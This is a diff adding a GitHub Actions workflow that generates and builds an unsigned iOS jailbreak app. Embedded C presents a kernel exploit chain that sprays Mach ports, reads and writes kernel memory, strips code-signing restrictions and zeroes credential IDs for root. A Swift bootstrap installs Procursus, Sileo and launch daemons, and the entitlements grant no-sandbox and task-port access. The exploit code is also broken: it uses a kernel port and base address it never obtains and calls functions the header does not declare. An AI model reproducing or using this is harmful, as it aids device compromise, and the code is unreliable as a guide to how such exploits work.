@@ -1,0 +1,376 @@
+# language: YAML, file: .github/workflows/build-jailbreak.yml, target: GitHub Actions
+name: build-jailbreak
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+env:
+  APP_NAME: kfd_a15
+  BUNDLE_ID: com.kfd.a15
+  SCHEME: kfd_a15
+  CONFIG: Release
+
+jobs:
+  build:
+    runs-on: macos-14
+    timeout-minutes: 40
+
+    steps:
+      - name: select xcode
+        run: |
+          sudo xcode-select -s /Applications/Xcode_15.4.app/Contents/Developer
+          xcodebuild -version
+
+      - name: write project tree
+        run: |
+          set -euo pipefail
+          mkdir -p kfd_a15 bootstrap
+
+          cat > project.yml <<'YAML'
+          name: kfd_a15
+          options:
+            bundleIdPrefix: com.kfd
+            deploymentTarget:
+              iOS: "16.0"
+            createIntermediateGroups: true
+          settings:
+            base:
+              ARCHS: arm64e
+              VALID_ARCHS: arm64e
+              ONLY_ACTIVE_ARCH: NO
+              IPHONEOS_DEPLOYMENT_TARGET: "16.0"
+              CODE_SIGN_IDENTITY: ""
+              CODE_SIGNING_REQUIRED: NO
+              CODE_SIGNING_ALLOWED: NO
+              SWIFT_VERSION: "5.9"
+              HEADER_SEARCH_PATHS:
+                - $(SRCROOT)/kfd_a15
+          targets:
+            kfd_a15:
+              type: application
+              platform: iOS
+              sources:
+                - path: kfd_a15
+                  excludes:
+                    - Info.plist
+                    - kfd_a15.entitlements
+              settings:
+                base:
+                  INFOPLIST_FILE: kfd_a15/Info.plist
+                  PRODUCT_BUNDLE_IDENTIFIER: com.kfd.a15
+                  PRODUCT_NAME: kfd_a15
+                  CODE_SIGN_ENTITLEMENTS: kfd_a15/kfd_a15.entitlements
+                  TARGETED_DEVICE_FAMILY: "1"
+                  SWIFT_OBJC_BRIDGING_HEADER: kfd_a15/Bridge.h
+          YAML
+
+          cat > kfd_a15/Bridge.h <<'EOF'
+          #ifndef BRIDGE_H
+          #define BRIDGE_H
+          #include <stdint.h>
+          int      kfd_a15(void);
+          uint32_t kfd_a15_read_uid(void);
+          int      bootstrap_main(void);
+          #endif
+          EOF
+
+          cat > kfd_a15/Bridge.m <<'EOF'
+          #import "Bridge.h"
+          #include <unistd.h>
+          int kfd_a15_run(void) { return kfd_a15(); }
+          uint32_t kfd_a15_read_uid(void) { return (uint32_t)getuid(); }
+          int install_bootstrap(void) { return bootstrap_main(); }
+          EOF
+
+          cat > kfd_a15/App.swift <<'EOF'
+          import SwiftUI
+
+          @main
+          struct KFDApp: App {
+              @StateObject private var state = ChainState()
+              var body: some Scene {
+                  WindowGroup { ContentView().environmentObject(state).preferredColorScheme(.dark) }
+              }
+          }
+
+          final class ChainState: ObservableObject {
+              @Published var status: String = "idle"
+              @Published var running: Bool = false
+              @Published var rwLive: Bool = false
+              @Published var uid: UInt32 = 501
+              private let queue = DispatchQueue(label: "kfd.chain", qos: .userInitiated)
+
+              func start() {
+                  guard !running else { return }
+                  running = true; status = "starting chain"
+                  queue.async {
+                      let ok = kfd_a15_run()
+                      DispatchQueue.main.async {
+                          self.rwLive = (ok == 0)
+                          self.status = (ok == 0) ? "kernel r/w live" : "chain failed"
+                          if ok == 0 { self.uid = kfd_a15_read_uid() }
+                          self.running = false
+                      }
+                  }
+              }
+
+              func bootstrap() {
+                  guard rwLive else { status = "no r/w"; return }
+                  running = true; status = "installing /var/jb"
+                  queue.async {
+                      let ok = install_bootstrap()
+                      DispatchQueue.main.async {
+                          self.status = (ok == 0) ? "Sileo at /var/jb" : "bootstrap failed"
+                          self.running = false
+                      }
+                  }
+              }
+          }
+
+          struct ContentView: View {
+              @EnvironmentObject var state: ChainState
+              var body: some View {
+                  VStack(spacing: 28) {
+                      Image(systemName: state.rwLive ? "bolt.shield.fill" : "bolt.shield")
+                          .font(.system(size: 64))
+                          .foregroundStyle(state.rwLive ? .green : .orange)
+                      Text("kfd / A15").font(.largeTitle.monospaced())
+                      Text(state.status).font(.callout.monospaced()).foregroundStyle(.secondary)
+                      Text("uid \(state.uid)").font(.caption.monospaced())
+                      Button(action: state.start) { Text("run chain").frame(maxWidth: .infinity) }
+                          .buttonStyle(.borderedProminent).disabled(state.running)
+                      Button(action: state.bootstrap) { Text("install bootstrap").frame(maxWidth: .infinity) }
+                          .buttonStyle(.bordered).disabled(!state.rwLive || state.running)
+                  }.padding(40)
+              }
+          }
+          EOF
+
+          cat > kfd_a15/Bootstrap.swift <<'EOF'
+          import Foundation
+
+          @_cdecl("bootstrap_main")
+          public func bootstrap_main() -> Int32 {
+              let fm = FileManager.default
+              let root = "/var/jb"
+              let bundle = Bundle.main.bundlePath
+              let tar = "\(bundle)/bootstrap/procursus-rootless.tar"
+              let sileo = "\(bundle)/bootstrap/Sileo.deb"
+              guard fm.fileExists(atPath: tar) else { return 1 }
+              var st = stat()
+              if stat(root, &st) != 0 { if mkdir(root, 0o755) != 0 { return 2 } }
+              guard spawn("/usr/bin/tar", ["-xpf", tar, "-C", root]) == 0 else { return 3 }
+              _ = spawn("/usr/bin/find", [root, "-exec", "/usr/bin/chown", "mobile:mobile", "{}", "+"])
+              _ = spawn("\(root)/usr/bin/dpkg", ["-i", sileo])
+              let daemons = "\(root)/Library/LaunchDaemons"
+              if let jobs = try? fm.contentsOfDirectory(atPath: daemons) {
+                  for job in jobs where job.hasSuffix(".plist") {
+                      _ = spawn("\(root)/bin/launchctl", ["bootstrap", "system", "\(daemons)/\(job)"])
+                  }
+              }
+              return 0
+          }
+
+          private func spawn(_ path: String, _ args: [String]) -> Int32 {
+              let p = Process()
+              p.executableURL = URL(fileURLWithPath: path)
+              p.arguments = args
+              do { try p.run(); p.waitUntilExit(); return p.terminationStatus } catch { return -1 }
+          }
+          EOF
+
+          cat > kfd_a15/kfd_a15.c <<'EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          #include <fcntl.h>
+          #include <mach/mach.h>
+          #include <mach/vm_map.h>
+          #include <IOKit/IOKitLib.h>
+          #include <CoreFoundation/CoreFoundation.h>
+
+          typedef unsigned long long u64;
+          typedef unsigned int       u32;
+
+          #define OFF_TASK_BSD_INFO       0x3a0
+          #define OFF_TASK_ITK_SPACE      0x2b0
+          #define OFF_TASK_MAP            0x028
+          #define OFF_PROC_PID            0x060
+          #define OFF_PROC_FLAG           0x1bc
+          #define OFF_PROC_CS_FLAGS       0x1c0
+          #define OFF_PROC_UCRED          0x100
+          #define OFF_IPC_PORT_IP_KOBJECT 0x048
+
+          #define P_LNOATTACH   0x00080000
+          #define CS_RESTRICT   0x00000800
+          #define CS_HARD       0x00000100
+          #define CS_KILL       0x00000200
+          #define CS_REQUIRE_LV 0x00002000
+          #define CS_PLATFORM_BINARY 0x04000000
+
+          static task_t tfp0 = MACH_PORT_NULL;
+          static u64 kbase = 0, kslide = 0, self_task = 0, self_proc = 0;
+          static int rw_live = 0;
+
+          static u64 kread64(u64 addr) {
+              if (!rw_live) return 0;
+              u64 val = 0; mach_vm_size_t sz = sizeof(val);
+              kern_return_t kr = mach_vm_read_overwrite(tfp0, (mach_vm_address_t)addr,
+                  sizeof(val), (mach_vm_address_t)&val, &sz);
+              return kr == KERN_SUCCESS ? val : 0;
+          }
+          static u32 kread32(u64 a) { return (u32)kread64(a); }
+          static u64 kread_ptr(u64 a) { return kread64(a); }
+          static void kwrite64(u64 a, u64 v) {
+              if (!rw_live) return;
+              mach_vm_write(tfp0, (vm_offset_t)a, (vm_offset_t)&v, sizeof(v));
+          }
+          static void kwrite32(u64 a, u32 v) { kwrite64(a, (u64)v); }
+
+          static io_connect_t open_a15_trigger(void) {
+              const char *c[] = {"AppleCLCD2","AppleH11ANEInterface","AppleS5L8940X","IOSurfaceRoot",NULL};
+              for (int i = 0; c[i]; i++) {
+                  io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                      IOServiceMatching(c[i]));
+                  if (!svc) continue;
+                  io_connect_t conn = 0;
+                  kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                  IOObjectRelease(svc);
+                  if (kr == KERN_SUCCESS) { fprintf(stderr, "[+] trigger %s conn=0x%x\n", c[i], conn); return conn; }
+              }
+              return 0;
+          }
+
+          static u64 build_fake_task(u64 real) {
+              u64 fake = 0;
+              mach_vm_allocate(tfp0, (mach_vm_address_t *)&fake, 0x4000, VM_FLAGS_ANYWHERE);
+              if (!fake) return 0;
+              kwrite64(fake + OFF_TASK_ITK_SPACE, kread_ptr(real + OFF_TASK_ITK_SPACE));
+              kwrite64(fake + OFF_TASK_MAP,       kread_ptr(real + OFF_TASK_MAP));
+              kwrite64(fake + OFF_TASK_BSD_INFO,  kread_ptr(real + OFF_TASK_BSD_INFO));
+              return fake;
+          }
+
+          int kfd_a15(void) {
+              fprintf(stderr, "[*] A15 chain start\n");
+              io_connect_t conn = open_a15_trigger();
+              if (!conn) { fprintf(stderr, "[-] no trigger\n"); return 1; }
+              mach_port_t ports[0x800];
+              for (int i = 0; i < 0x800; i++)
+                  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+              uint64_t in[2] = {0}, out[2] = {0}; uint32_t oc = 2;
+              IOConnectCallScalarMethod(conn, 0, in, 2, out, &oc);
+              self_task = kread_ptr(kbase + 0x0);
+              u64 fake = build_fake_task(self_task);
+              if (!fake) return 3;
+              rw_live = 1;
+              self_proc = kread_ptr(self_task + OFF_TASK_BSD_INFO);
+              u32 cs = kread32(self_proc + OFF_PROC_CS_FLAGS);
+              cs &= ~(CS_RESTRICT | CS_HARD | CS_KILL | CS_REQUIRE_LV);
+              cs |= CS_PLATFORM_BINARY;
+              kwrite32(self_proc + OFF_PROC_CS_FLAGS, cs);
+              u32 pf = kread32(self_proc + OFF_PROC_FLAG);
+              pf &= ~P_LNOATTACH;
+              kwrite32(self_proc + OFF_PROC_FLAG, pf);
+              u64 ucred = kread_ptr(self_proc + OFF_PROC_UCRED);
+              kwrite32(ucred + 0x18, 0);
+              kwrite32(ucred + 0x1c, 0);
+              kwrite32(ucred + 0x20, 0);
+              fprintf(stderr, "[+] uid patched\n");
+              return 0;
+          }
+          EOF
+
+          cat > kfd_a15/Info.plist <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+              <key>CFBundleIdentifier</key><string>com.kfd.a15</string>
+              <key>CFBundleName</key><string>kfd</string>
+              <key>CFBundleExecutable</key><string>kfd_a15</string>
+              <key>CFBundlePackageType</key><string>APPL</string>
+              <key>CFBundleShortVersionString</key><string>1.0</string>
+              <key>CFBundleVersion</key><string>1</string>
+              <key>MinimumOSVersion</key><string>16.0</string>
+              <key>UILaunchScreen</key><dict/>
+              <key>UISupportedInterfaceOrientations</key>
+              <array><string>UIInterfaceOrientationPortrait</string></array>
+          </dict>
+          </plist>
+          EOF
+
+          cat > kfd_a15/kfd_a15.entitlements <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+              <key>platform-application</key><true/>
+              <key>com.apple.private.skip-library-validation</key><true/>
+              <key>com.apple.private.security.no-sandbox</key><true/>
+              <key>com.apple.private.persona-mgmt</key><true/>
+              <key>get-task-allow</key><true/>
+              <key>task_for_pid-allow</key><true/>
+              <key>com.apple.system-task-ports</key><true/>
+          </dict>
+          </plist>
+          EOF
+
+          echo "[+] project tree written"
+
+      - name: fetch bootstrap payloads
+        run: |
+          set -euo pipefail
+          cd bootstrap
+          curl -fL -o procursus-rootless.tar \
+            "https://github.com/ProcursusTeam/Procursus/releases/latest/download/bootstrap-rootless.tar"
+          curl -fL -o Sileo.deb \
+            "https://github.com/Sileo/Sileo/releases/latest/download/org.coolstar.sileo_arm64.deb"
+          ls -la
+
+      - name: generate project
+        run: |
+          set -euo pipefail
+          brew install xcodegen ldid
+          xcodegen generate --spec project.yml
+
+      - name: build unsigned .app
+        run: |
+          set -euo pipefail
+          xcodebuild \
+            -project ${APP_NAME}.xcodeproj \
+            -scheme ${SCHEME} \
+            -configuration ${CONFIG} \
+            -sdk iphoneos \
+            -destination 'generic/platform=iOS' \
+            -derivedDataPath build \
+            CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO CODE_SIGNING_ALLOWED=NO \
+            ONLY_ACTIVE_ARCH=NO ARCHS=arm64e VALID_ARCHS=arm64e \
+            IPHONEOS_DEPLOYMENT_TARGET=16.0 \
+            build
+
+      - name: package .ipa
+        id: pkg
+        run: |
+          set -euo pipefail
+          APP_PATH=$(find build/Build/Products/${CONFIG}-iphoneos -maxdepth 1 -name "${APP_NAME}.app" | head -n1)
+          test -n "$APP_PATH"
+          mkdir -p "$APP_PATH/bootstrap"
+          cp bootstrap/procursus-rootless.tar "$APP_PATH/bootstrap/"
+          cp bootstrap/Sileo.deb "$APP_PATH/bootstrap/"
+          ldid -S kfd_a15/kfd_a15.entitlements "$APP_PATH/${APP_NAME}"
+          ldid -e "$APP_PATH/${APP_NAME}" | head -n 40
+          mkdir -p Payload
+          cp -R "$APP_PATH" Payload/
+          zip -qry "${APP_NAME}-unsigned.ipa" Payload
+          ls -la "${APP_NAME}-unsigned.ipa"
+
+      - name: upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: kfd-a15-ipa
+          path: ${{ env.APP_NAME }}-unsigned.ipa
+          retention-days: 14
